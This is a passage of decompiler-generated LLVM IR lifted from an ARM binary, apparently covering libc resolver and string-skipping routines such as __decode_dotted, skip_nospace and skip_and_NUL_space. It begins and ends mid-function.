  %v2_2f94c = inttoptr i32 %v1_2f94c to i8*
  %v3_2f94c = load i8, i8* %v2_2f94c, align 1
  %v4_2f94c = zext i8 %v3_2f94c to i32
  %v1_2f958 = add i32 %v2_2f938, 6
  %v2_2f958 = inttoptr i32 %v1_2f958 to i8*
  %v3_2f958 = load i8, i8* %v2_2f958, align 1
  %v4_2f958 = zext i8 %v3_2f958 to i32
  store i32 %v4_2f958, i32* %r3.global-to-local, align 4
  %v1_2f95c = add i32 %v2_2f938, 9
  %v2_2f95c = inttoptr i32 %v1_2f95c to i8*
  %v3_2f95c = load i8, i8* %v2_2f95c, align 1
  %v4_2f95c = zext i8 %v3_2f95c to i32
  %v3_2f964 = inttoptr i32 %v2_2f938 to i8*
  %v4_2f964 = load i8, i8* %v3_2f964, align 1
  %v6_2f964 = zext i8 %v4_2f964 to i32
  %v1_2f968 = add i32 %v2_2f938, 3
  %v2_2f968 = inttoptr i32 %v1_2f968 to i8*
  %v3_2f968 = load i8, i8* %v2_2f968, align 1
  %v4_2f968 = zext i8 %v3_2f968 to i32
  store i32 %v4_2f968, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_2f970 = inttoptr i32 %v1_2f93c to i8*
  %v3_2f970 = load i8, i8* %v2_2f970, align 1
  %v4_2f970 = zext i8 %v3_2f970 to i32
  store i32 %v4_2f970, i32* %ip.global-to-local, align 4
  %v1_2f974 = add i32 %v2_2f938, 1
  %v2_2f974 = inttoptr i32 %v1_2f974 to i8*
  %v3_2f974 = load i8, i8* %v2_2f974, align 1
  %v4_2f974 = zext i8 %v3_2f974 to i32
  %v4_2f978 = mul nuw nsw i32 %v4_2f94c, 256
  %v5_2f978 = or i32 %v4_2f95c, %v4_2f978
  store i32 %v5_2f978, i32* @r6, align 4
  store i32 %v4_2f944, i32* @r7, align 4
  %v4_2f980 = mul nuw nsw i32 %v6_2f964, 256
  %v5_2f980 = or i32 %v4_2f974, %v4_2f980
  store i32 %v5_2f980, i32* @lr, align 4
  %v4_2f984 = mul nuw nsw i32 %v4_2f970, 256
  %v5_2f984 = or i32 %v4_2f984, %v4_2f968
  store i32 %v5_2f984, i32* %r3.global-to-local, align 4
  store i32 %v2_2f918, i32* @r5, align 4
  store i32 %v4_2f958, i32* @ip, align 4
  %v1_2f998 = add i32 %v2_2f938, 10
  store i32 %v1_2f998, i32* %r1.global-to-local, align 4
  %v1_2f99c = add i32 %v2_2f934, 10
  store i32 %v1_2f99c, i32* @r4, align 4
  %v2_2f9a0 = sub i32 %v2_2f918, %v5_2f978
  %v3_2f9a0 = icmp uge i32 %v2_2f918, %v5_2f978
  store i1 %v3_2f9a0, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_2f9a0
  %v6_2f9a0 = and i32 %v2_2f918, %tmp226
  %v7_2f9a0 = icmp slt i32 %v6_2f9a0, 0
  %v8_2f9a0 = icmp slt i32 %v2_2f9a0, 0
  store i32 %v2_2f92c, i32* %stack_var_-144, align 4
  %v2_2f9c0 = xor i1 %v8_2f9a0, %v7_2f9a0
  br i1 %v2_2f9c0, label %dec_label_pc_2f9d0, label %dec_label_pc_2f9c8

dec_label_pc_2f9c8:                               ; preds = %dec_label_pc_2f928
  %v0_2f9c4 = load i32, i32* @sb, align 4
  %v2_2f9c4 = add i32 %v0_2f9c4, %v5_2f978
  store i32 %v2_2f9c4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f9c8 = icmp slt i32 %v2_2f9c4, 0
  br i1 %v1_2f9c8, label %dec_label_pc_2f9d0, label %dec_label_pc_2f9ec

dec_label_pc_2f9d0:                               ; preds = %dec_label_pc_2f9c8, %dec_label_pc_2f928, %dec_label_pc_2f8e4, %dec_label_pc_2f9c8.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2f9d4 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_2f9d4, label %dec_label_pc_2fb3c, label %dec_label_pc_2f9dc

dec_label_pc_2f9dc:                               ; preds = %dec_label_pc_2f9d0
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2f9e0, label %dec_label_pc_2fb3c, label %dec_label_pc_2fb14

dec_label_pc_2f9ec:                               ; preds = %dec_label_pc_2f9c8
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2f9f0 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_2f9f0, label %dec_label_pc_2fa94, label %dec_label_pc_2f9f8

dec_label_pc_2f9f8:                               ; preds = %dec_label_pc_2f9ec
  %v0_2f9f8 = load i32, i32* @fp, align 4
  %v1_2f9f8 = add i32 %v0_2f9f8, 28
  store i32 %v1_2f9f8, i32* %r3.global-to-local, align 4
  %v1_2f9fc = inttoptr i32 %v1_2f9f8 to i32*
  %v2_2f9fc = load i32, i32* %v1_2f9fc, align 4
  store i32 %v2_2f9fc, i32* @r3, align 4
  %v3_2f9fc = add i32 %v0_2f9f8, 32
  %v4_2f9fc = inttoptr i32 %v3_2f9fc to i32*
  %v5_2f9fc = load i32, i32* %v4_2f9fc, align 4
  store i32 %v5_2f9fc, i32* @ip, align 4
  %v6_2f9fc = add i32 %v0_2f9f8, 36
  %v7_2f9fc = inttoptr i32 %v6_2f9fc to i32*
  %v8_2f9fc = load i32, i32* %v7_2f9fc, align 4
  store i32 %v8_2f9fc, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_2f9f8, i32* @r0, align 4
  store i32 %v2_2f8cc, i32* @r1, align 4
  %v0_2fa18 = call i32 @memcpy()
  %v0_2fa1c = load i32, i32* @fp, align 4
  %v1_2fa1c = add i32 %v0_2fa1c, 4
  %v2_2fa1c = inttoptr i32 %v1_2fa1c to i32*
  %v3_2fa1c = load i32, i32* %v2_2fa1c, align 4
  %v2_2fa20 = icmp ugt i32 %v3_2fa1c, 23
  store i1 %v2_2fa20, i1* %cpsr_c.global-to-local, align 1
  %v7_2fa20 = icmp eq i32 %v3_2fa1c, 24
  br i1 %v7_2fa20, label %dec_label_pc_2fa44, label %dec_label_pc_2fa28

dec_label_pc_2fa28:                               ; preds = %dec_label_pc_2f9f8
  %v1_2fa28 = add i32 %v0_2fa1c, 28
  %v2_2fa28 = inttoptr i32 %v1_2fa28 to i32*
  %v3_2fa28 = load i32, i32* %v2_2fa28, align 4
  store i32 %v3_2fa28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2fa2c = icmp eq i32 %v3_2fa28, 0
  br i1 %v2_2fa2c, label %dec_label_pc_2fb14, label %dec_label_pc_2fa34

dec_label_pc_2fa34:                               ; preds = %dec_label_pc_2fa28
  store i1 %v2_2fa38, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2fa38, label %dec_label_pc_2fa44, label %bb227

bb227:                                            ; preds = %dec_label_pc_2fa34
  store i1 %v3_2fa3c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_2fa3c, label %dec_label_pc_2fa44, label %dec_label_pc_2fb14

dec_label_pc_2fa44:                               ; preds = %dec_label_pc_2fa34, %bb227, %dec_label_pc_2f9f8
  store i32 %v0_2f41c, i32* %r1.global-to-local, align 4
  %v3_2fa48 = icmp uge i32 %v3_2fa1c, %v0_2f41c
  store i1 %v3_2fa48, i1* %cpsr_c.global-to-local, align 1
  %v9_2fa48 = icmp eq i32 %v3_2fa1c, %v0_2f41c
  br i1 %v9_2fa48, label %dec_label_pc_2fa58, label %bb228

bb228:                                            ; preds = %dec_label_pc_2fa44
  br label %dec_label_pc_2faec

dec_label_pc_2fa58:                               ; preds = %dec_label_pc_2fa44
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_2fa60 = add i32 %v0_2fa1c, 16
  %v2_2fa60 = inttoptr i32 %v1_2fa60 to i32*
  %v3_2fa60 = load i32, i32* %v2_2fa60, align 4
  %v2_2fa64 = sub i32 %tmp159, %stack_var_-452.061
  %v1_2fa68 = add i32 %v2_2fa64, -1
  store i32 %v1_2fa68, i32* %r3.global-to-local, align 4
  %v1_2fa6c = add i32 %v3_2fa60, 4
  %v2_2fa70 = mul i32 %v1_2fa6c, %v1_2fa68
  store i32 %v2_2fa70, i32* %r1.global-to-local, align 4
  %v1_2fa74 = add i32 %v0_2fa1c, 32
  %v2_2fa74 = inttoptr i32 %v1_2fa74 to i32*
  %v3_2fa74 = load i32, i32* %v2_2fa74, align 4
  %v3_2fa78 = icmp uge i32 %v2_2fa70, %v3_2fa74
  store i1 %v3_2fa78, i1* %cpsr_c.global-to-local, align 1
  %v2_2fa7c = add i32 %v0_2fa1c, 36
  %v3_2fa7c = inttoptr i32 %v2_2fa7c to i32*
  store i32 %v1_2fa68, i32* %v3_2fa7c, align 4
  %tmp286 = icmp ugt i32 %v2_2fa70, %v3_2fa74
  br i1 %tmp286, label %dec_label_pc_2fb14, label %dec_label_pc_2fa84

dec_label_pc_2fa84:                               ; preds = %dec_label_pc_2fa58
  store i32 0, i32* @r7, align 4
  %v1_2fa8c = load i32, i32* @fp, align 4
  %v2_2fa8c = add i32 %v1_2fa8c, 36
  %v3_2fa8c = inttoptr i32 %v2_2fa8c to i32*
  store i32 0, i32* %v3_2fa8c, align 4
  br label %dec_label_pc_2faec

dec_label_pc_2fa94:                               ; preds = %dec_label_pc_2f9ec
  store i32 %v2_2f92c, i32* @r0, align 4
  %v0_2fa98 = call i32 @free()
  store i32 %v5_2f980, i32* %r3.global-to-local, align 4
  store i32 %v0_2f41c, i32* @ip, align 4
  %v3_2faa4 = icmp uge i32 %v5_2f980, %v0_2f41c
  store i1 %v3_2faa4, i1* %cpsr_c.global-to-local, align 1
  %v9_2faa4 = icmp eq i32 %v5_2f980, %v0_2f41c
  br i1 %v9_2faa4, label %dec_label_pc_2faac, label %dec_label_pc_2faec

dec_label_pc_2faac:                               ; preds = %dec_label_pc_2fa94
  %v0_2faac = load i32, i32* @fp, align 4
  %v1_2faac = add i32 %v0_2faac, 16
  %v2_2faac = inttoptr i32 %v1_2faac to i32*
  %v3_2faac = load i32, i32* %v2_2faac, align 4
  store i32 %v3_2faac, i32* %r1.global-to-local, align 4
  store i32 %v5_2f978, i32* %r3.global-to-local, align 4
  %v3_2fab4 = icmp uge i32 %v3_2faac, %v5_2f978
  store i1 %v3_2fab4, i1* %cpsr_c.global-to-local, align 1
  %v9_2fab4 = icmp eq i32 %v3_2faac, %v5_2f978
  br i1 %v9_2fab4, label %dec_label_pc_2fac8, label %dec_label_pc_2fabc

dec_label_pc_2fabc:                               ; preds = %dec_label_pc_2faac
  %v1_2fabc = inttoptr i32 %v0_2faac to i32*
  %v2_2fabc = load i32, i32* %v1_2fabc, align 4
  store i32 %v2_2fabc, i32* @r0, align 4
  %v0_2fac0 = call i32 @free()
  br label %dec_label_pc_2fb3c

dec_label_pc_2fac8:                               ; preds = %dec_label_pc_2faac
  %v1_2fac8 = add i32 %v0_2faac, 36
  %v2_2fac8 = inttoptr i32 %v1_2fac8 to i32*
  %v3_2fac8 = load i32, i32* %v2_2fac8, align 4
  %v1_2facc = add i32 %v0_2faac, 28
  %v2_2facc = inttoptr i32 %v1_2facc to i32*
  %v3_2facc = load i32, i32* %v2_2facc, align 4
  store i32 %v3_2facc, i32* @r3, align 4
  %v3_2fad0 = mul i32 %v3_2fac8, %v5_2f978
  %v4_2fad0 = add i32 %v3_2facc, %v3_2fad0
  store i32 %v4_2fad0, i32* @r0, align 4
  store i32 %v5_2f978, i32* @r2, align 4
  store i32 %v1_2f998, i32* @r1, align 4
  %v0_2fadc = call i32 @memcpy()
  %v0_2fae0 = load i32, i32* @fp, align 4
  %v1_2fae0 = add i32 %v0_2fae0, 36
  %v2_2fae0 = inttoptr i32 %v1_2fae0 to i32*
  %v3_2fae0 = load i32, i32* %v2_2fae0, align 4
  %v1_2fae4 = add i32 %v3_2fae0, 1
  store i32 %v1_2fae4, i32* %r3.global-to-local, align 4
  store i32 %v1_2fae4, i32* %v2_2fae0, align 4
  br label %dec_label_pc_2faec

dec_label_pc_2faec:                               ; preds = %bb228, %dec_label_pc_2fa94, %dec_label_pc_2fa84, %dec_label_pc_2fac8
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_2fac8 ], [ 0, %dec_label_pc_2fa94 ], [ 0, %dec_label_pc_2fa84 ], [ 1, %bb228 ]
  %v1_2faf4 = load i32, i32* @r4, align 4
  %v1_2faf8 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_2faf8, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_2fb0c = icmp uge i32 %v1_2faf8, %tmp159
  store i1 %v3_2fb0c, i1* %cpsr_c.global-to-local, align 1
  %v5_2fb10 = icmp slt i32 %v1_2faf8, %tmp159
  br i1 %v5_2fb10, label %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge, label %dec_label_pc_2fb14

dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge:  ; preds = %dec_label_pc_2faec
  %v2_2faf4 = add i32 %v1_2faf4, %stack_var_-460.364
  %v0_2f8e8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_2f8e4

dec_label_pc_2fb14:                               ; preds = %dec_label_pc_2f9dc, %dec_label_pc_2f8c0, %dec_label_pc_2faec, %dec_label_pc_2fa28, %dec_label_pc_2fa58, %bb227
  %v1_2fb18 = call i32 @__GI_close(i32 %v3_2f6ec)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2fb20 = icmp eq i32 %arg3, 0
  br i1 %v2_2fb20, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_2fb14
  %v1_2fb28 = load i32, i32* @sl, align 4
  %v3_2fb24 = inttoptr i32 %arg3 to i32*
  store i32 %v1_2fb28, i32* %v3_2fb24, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_2fb14
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_2fb30.2053 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_2fb20, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  store i32 %v1_2f464, i32* @r0, align 4
  %v0_2fb34 = call i32 @free()
  br label %dec_label_pc_2fba4

dec_label_pc_2fb3c:                               ; preds = %thread-pre-split, %dec_label_pc_2f738, %dec_label_pc_2f898, %dec_label_pc_2f890, %dec_label_pc_2f840, %dec_label_pc_2f84c, %dec_label_pc_2f858thread-pre-split, %thread-pre-split.thread, %dec_label_pc_2f810, %dec_label_pc_2f9dc, %dec_label_pc_2f9d0, %dec_label_pc_2f6fc, %dec_label_pc_2f6dc, %dec_label_pc_2fabc
  %v1_2fb40 = add i32 %v0_2f600, 1
  store i32 %v1_2fb40, i32* @r5, align 4
  br label %dec_label_pc_2fb4c

dec_label_pc_2fb4c:                               ; preds = %.thread7, %dec_label_pc_2fb3c
  %storemerge22 = phi i32 [ -1, %dec_label_pc_2fb3c ], [ %v7_2f7fc, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_2fb40, %dec_label_pc_2fb3c ], [ %v0_2f600, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_2fb50 = add i32 %stack_var_-476.1, -1
  store i32 %v1_2fb50, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_2fb50, 1
  br i1 %tmp232, label %dec_label_pc_2fb6c, label %dec_label_pc_2f504

dec_label_pc_2fb64:                               ; preds = %dec_label_pc_2f6b0, %bb218, %bb213, %.thread5, %dec_label_pc_2f480
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_2fb6c

dec_label_pc_2fb6c:                               ; preds = %dec_label_pc_2fb4c, %.thread132, %dec_label_pc_2fb64
  %stack_var_-472.1 = phi i32 [ %v1_2f464, %dec_label_pc_2fb64 ], [ 0, %.thread132 ], [ %v1_2f464, %dec_label_pc_2fb4c ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_2fb64 ], [ -1, %.thread132 ], [ %v3_2f6ec, %dec_label_pc_2fb4c ]
  %v0_2fb6c = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_2fb78 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_2fb78, i1* %cpsr_c.global-to-local, align 1
  %v7_2fb78 = icmp eq i32 %stack_var_-488.2, -1
  %v2_2fb7c = inttoptr i32 %v0_2fb6c to i32*
  store i32 -1, i32* %v2_2fb7c, align 4
  br i1 %v7_2fb78, label %dec_label_pc_2fb8c, label %dec_label_pc_2fb84

dec_label_pc_2fb84:                               ; preds = %dec_label_pc_2fb6c, %dec_label_pc_2f838
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_2fb6c ], [ %v1_2f464, %dec_label_pc_2f838 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_2fb6c ], [ %v3_2f6ec, %dec_label_pc_2f838 ]
  %v1_2fb88 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_2fb8c

dec_label_pc_2fb8c:                               ; preds = %dec_label_pc_2fb6c, %dec_label_pc_2fb84
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_2fb6c ], [ %stack_var_-472.2, %dec_label_pc_2fb84 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_2fb90 = call i32 @free()
  %v0_2fb94 = load i32, i32* @sl, align 4
  store i32 %v0_2fb94, i32* @r0, align 4
  %v0_2fb98 = call i32 @free()
  br label %dec_label_pc_2fba4

dec_label_pc_2fba4:                               ; preds = %bb231, %dec_label_pc_2fb8c
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_2fb8c ], [ %v4_2f774, %bb231 ]
  store i32 %v3_2f408, i32* @r4, align 4
  store i32 %v6_2f408, i32* @r5, align 4
  store i32 %v9_2f408, i32* @r6, align 4
  store i32 %v12_2f408, i32* @r7, align 4
  store i32 %v15_2f408, i32* @r8, align 4
  store i32 %v18_2f408, i32* @sb, align 4
  store i32 %v21_2f408, i32* @sl, align 4
  store i32 %v24_2f408, i32* @fp, align 4
  store i32 %v27_2f408, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_2fb50, { 1, 2, 0 }
  uselistorder i32 %v1_2faf8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_2faac, { 2, 1, 0, 3 }
  uselistorder i32 %v1_2fa68, { 1, 0, 2 }
  uselistorder i32 %v2_2f9a0, { 1, 0 }
  uselistorder i32 %v5_2f978, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_2f938, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_2f934, { 1, 0 }
  uselistorder i32 %v2_2f918, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_2f914, { 1, 0 }
  uselistorder i32 %v1_2f910, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_2f890, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_2f86c, { 1, 0 }
  uselistorder i32 %v3_2f860, { 0, 2, 1, 3 }
  uselistorder i32 %v0_2f860, { 0, 2, 1 }
  uselistorder i32 %v2_2f850, { 0, 2, 1 }
  uselistorder i1 %v7_2f784, { 1, 0 }
  uselistorder i32 %v1_2f784, { 1, 0 }
  uselistorder i32 %v0_2f784, { 1, 0 }
  uselistorder i32 %v4_2f774, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v3_2f6ec, { 1, 0, 2, 7, 3, 6, 5, 8, 9, 4 }
  uselistorder i32 %v6_2f6a4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2f630, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_2f618, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_2f60c, { 1, 0 }
  uselistorder i32 %v0_2f600, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_2f5b8, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_2f508, { 1, 0 }
  uselistorder i32 %v1_2f50c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v1_2f7d8, { 2, 0, 1 }
  uselistorder i32 %v2_2f660, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2f638, { 1, 0 }
  uselistorder i32 %v0_2f480, { 1, 0, 2 }
  uselistorder i32 %v1_2f464, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_2f430, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_2f41c, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0, 2, 3 }
  uselistorder i32 %tmp159, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 18, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 19, 20, 1, 33, 21, 22, 23, 24, 25, 26, 27, 53, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 1, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 23, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32, i32)* @__decode_dotted, { 1, 0, 3, 2 }
  uselistorder i32 -3, { 6, 4, 5, 7, 11, 0, 1, 3, 2, 10, 8, 9 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 27, { 3, 1, 0, 2 }
  uselistorder i8 46, { 3, 2, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 55944, { 2, 0, 1, 3 }
  uselistorder i32 512, { 6, 8, 5, 9, 4, 10, 11, 12, 13, 7, 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2fba4, { 1, 0 }
  uselistorder label %dec_label_pc_2fb8c, { 1, 0 }
  uselistorder label %dec_label_pc_2fb6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2fb64, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_2fb4c, { 1, 0 }
  uselistorder label %dec_label_pc_2fb3c, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_2fb14, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_2faec, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_2fa44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2f9d0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_2f8e4, { 1, 0 }
  uselistorder label %dec_label_pc_2f890, { 1, 0 }
  uselistorder label %dec_label_pc_2f860, { 1, 0 }
  uselistorder label %dec_label_pc_2f838, { 1, 0 }
  uselistorder label %dec_label_pc_2f784, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_2f5e0, { 1, 0 }
  uselistorder label %dec_label_pc_2f5a4, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d.13"(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_2fbb4:
  %v0_2fbb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2fbb4, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_2fbb4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_2fbb4, %bb
  %v7_2fbec = phi i32 [ %arg1, %dec_label_pc_2fbb4 ], [ 0, %bb ]
  ret i32 %v7_2fbec

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 20828, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19 }
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2fc48 = load i32, i32* @r4, align 4
  store i32 %v3_2fc48, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  store i32 20828, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_2fc58.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_2fc589 = inttoptr i32 %v0_2fc58.pre to i8*
  %v2_2fc5810 = load i8, i8* %v1_2fc589, align 1
  %v2_2fc5c12 = icmp eq i8 %v2_2fc5810, 0
  store i1 %v2_2fc5c12, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2fc5c12, label %dec_label_pc_2fc8c, label %dec_label_pc_2fc68

dec_label_pc_2fc68:                               ; preds = %entry, %bb8.dec_label_pc_2fc68_crit_edge
  %v1_2fc68 = phi i32 [ %v1_2fc68.pre, %bb8.dec_label_pc_2fc68_crit_edge ], [ 20828, %entry ]
  %v0_2fc68 = phi i32 [ %v0_2fc68.pre, %bb8.dec_label_pc_2fc68_crit_edge ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ]
  %v2_2fc5816 = phi i8 [ %v2_2fc58, %bb8.dec_label_pc_2fc68_crit_edge ], [ %v2_2fc5810, %entry ]
  %v2_2fc6017.in.in = phi i8 [ %v2_2fc58, %bb8.dec_label_pc_2fc68_crit_edge ], [ %v2_2fc5810, %entry ]
  %v1_2fc5815 = phi i8* [ %v1_2fc58, %bb8.dec_label_pc_2fc68_crit_edge ], [ %v1_2fc589, %entry ]
  %v2_2fc8014 = phi i32 [ %v2_2fc84, %bb8.dec_label_pc_2fc68_crit_edge ], [ %v0_2fc58.pre, %entry ]
  %v2_2fc6017.in = zext i8 %v2_2fc6017.in.in to i32
  %v2_2fc6017 = mul nuw nsw i32 %v2_2fc6017.in, 2
  %v2_2fc68 = add i32 %v1_2fc68, %v0_2fc68
  %v3_2fc68 = inttoptr i32 %v2_2fc68 to i32*
  %v4_2fc68 = load i32, i32* %v3_2fc68, align 4
  %v2_2fc6c = add i32 %v4_2fc68, %v2_2fc6017
  %v3_2fc6c = inttoptr i32 %v2_2fc6c to i16*
  %v4_2fc6c = load i16, i16* %v3_2fc6c, align 2
  %v1_2fc70 = and i16 %v4_2fc6c, 32
  %v2_2fc70 = icmp eq i16 %v1_2fc70, 0
  store i1 %v2_2fc70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2fc70, label %dec_label_pc_2fc8c, label %dec_label_pc_2fc78

dec_label_pc_2fc78:                               ; preds = %dec_label_pc_2fc68
  %v7_2fc78 = icmp eq i8 %v2_2fc5816, 35
  br i1 %v7_2fc78, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_2fc78
  %v8_2fc7c = icmp eq i8 %v2_2fc5816, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_2fc78, %bb
  %storemerge = phi i1 [ %v8_2fc7c, %bb ], [ %v7_2fc78, %dec_label_pc_2fc78 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_2fc80 = load i32, i32* %lr.global-to-local, align 4
  %v1_2fc80 = trunc i32 %v0_2fc80 to i8
  store i8 %v1_2fc80, i8* %v1_2fc5815, align 1
